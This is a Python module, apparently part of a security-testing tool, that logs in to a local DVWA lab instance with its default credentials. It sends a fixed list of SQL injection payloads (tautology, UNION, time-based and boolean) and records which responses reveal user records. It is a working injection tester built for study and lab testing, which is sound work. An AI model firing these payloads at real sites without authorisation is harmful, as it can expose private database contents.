import requests
import os
import json
from bs4 import BeautifulSoup
from urllib.parse import quote  # <-- this is new

class SQLInjectionManager:
    def __init__(self):
        self.output_dir = "outputs_sql"
        self.output_file = os.path.join(self.output_dir, "sql_results.json")
        self.login_url = "http://localhost:8080/login.php"
        self.username = "admin"
        self.password = "password"

    def perform_sql_injection(self, target_url, port, timeout=5, headers=None, enum_level=0):
        print(f"[SQLInjection] Starting test on {target_url}:{port}")
        if headers is None:
            headers = {}

        session = requests.Session()
        if not self._login_to_dvwa(session):
            print("[SQLInjection] Login failed.")
            return {"error": "Login failed"}

        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT NULL --",
            "' AND SLEEP(5)--",
            "1' OR 1=1#",
            "1' AND 1=2#"
        ]

        results = []
        id_num= 1
        for payload in payloads:
            encoded_payload = quote(payload)  # <-- this is the key fix
            full_url = f"{target_url}/?id={encoded_payload}&Submit=Submit"
           

            try:
                response = session.get(full_url, headers=headers, timeout=timeout)
                soup = BeautifulSoup(response.text, "html.parser")
                visible_text = soup.get_text().strip()
                useful_data = self._extract_useful_data(visible_text)
                is_vulnerable = bool(useful_data)

                result={
                    "id": id_num,
                    "target": target_url,
                    "port": port,
                    "timeout": timeout,
                    "headers": "empty",  # Convert headers to string
                    "payload": payload,
                    "status_code": response.status_code,
                    "snippet": useful_data[:300] if useful_data else "No useful data",
                    "vulnerable": is_vulnerable,
                    "error": False
                }
                results.append(result)
                print(f"[SQLInjection] Payload '{payload}' gave status {response.status_code}")
                

            except Exception as e:
                print(f"[SQLInjection] Error on payload '{payload}': {e}")
                results.append({
                    "id": id_num,
                    "target": target_url,
                    "port": port,
                    "timeout": timeout,
                    "headers": "empty",  # Convert headers to string
                    "payload": payload,
                    "status_code": 0,
                    "snippet": "No data due to error",
                    "vulnerable": False,
                    "error": str(e)
                })
            id_num+=1

        output = {
            "target": target_url,
            "port": port,
            "timeout": timeout,
            "headers": headers,
            "results": results,
            "vulnerable": any(r.get("vulnerable") for r in results)
        }

        os.makedirs(self.output_dir, exist_ok=True)
        try:
            with open(self.output_file, "r") as f:
                existing_data = json.load(f)
                if not isinstance(existing_data, list):
                    existing_data = [existing_data]
        except:
            existing_data = []

        existing_data.append(output)

        try:
            with open(self.output_file, "w") as f:
                json.dump(existing_data, f, indent=4)
            print(f"[SQLInjection] Results saved to {self.output_file}")
        except Exception as e:
            print(f"[SQLInjection] Failed to save results: {e}")

        return output

    def _login_to_dvwa(self, session):
        try:
            resp = session.get(self.login_url)
            soup = BeautifulSoup(resp.text, "html.parser")
            token = soup.find("input", {"name": "user_token"})
            csrf_token = token["value"] if token else ""

            payload = {
                "username": self.username,
                "password": self.password,
                "Login": "Login",
                "user_token": csrf_token
            }

            login_resp = session.post(self.login_url, data=payload)
            return "logout.php" in login_resp.text.lower() or "logout" in login_resp.text.lower()

        except Exception as e:
            print(f"[SQLInjection] Login error: {e}")
            return False

    def _extract_useful_data(self, text):
        # Boolean-based blind detection: capture presence/absence phrases
        if "exists in the database" in text:
            return "User ID exists in the database."
        elif "is MISSING from the database" in text:
            return "User ID is MISSING from the database."
        
        # Fallback for classic SQLi
        lines = text.splitlines()
        useful = [line.strip() for line in lines if "ID:" in line or "First name:" in line or "Surname:" in line]
        return "\n".join(useful) if useful else ""
